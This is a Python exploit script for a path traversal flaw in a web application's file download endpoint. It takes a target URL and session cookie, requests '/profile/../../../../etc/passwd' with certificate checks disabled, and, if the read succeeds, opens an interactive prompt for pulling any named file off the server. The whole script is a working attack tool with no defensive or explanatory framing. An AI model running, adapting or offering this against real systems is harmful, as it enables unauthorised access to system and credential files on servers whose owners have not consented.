'''
target
cookie
'''

import requests
import sys
import random
import re
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from rich.console import Console
from rich.table import Table

path = os.getcwd()
logs = (path + '/logs')


#init
def info():
    target_url = "<target>"
    Cookie = "<cookie>"
    console = Console()
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("TARGET")
    table.add_column("COOKIE")
    table.add_row(target_url,Cookie)
    console.print(table)
def POC_1(target_url, Cookie):
    vuln_url = target_url + "/common/download/resource?resource=/profile/../../../../etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":Cookie
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "root" in response.text and response.status_code == 200:

            print("\033[32mVulnerability exists\033[0m")
            print("\033[32m[o] Reply:\n{} \033[0m".format(response.text))
            while True:
                Filename = input("\033[35mFile >>> \033[0m")
                if Filename == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, Cookie, Filename)
        else:
            print("\033[33mVulnerability does not exist.\033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[33mVulnerability does not exist.\033[0m")

def POC_2(target_url, Cookie, Filename):
    vuln_url = target_url + "/common/download/resource?resource=/profile/../../../../{}".format(Filename)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":Cookie
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] Reply:\n{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[33mVulnerability does not exist.\033[0m")

if __name__ == '__main__':
    info()
    with open(logs +"/target.log", 'r') as f:
        target_url = f.read()
    with open(logs +"/cookie.log", 'r') as g:
        Cookie = g.read()
    POC_1(target_url, Cookie)
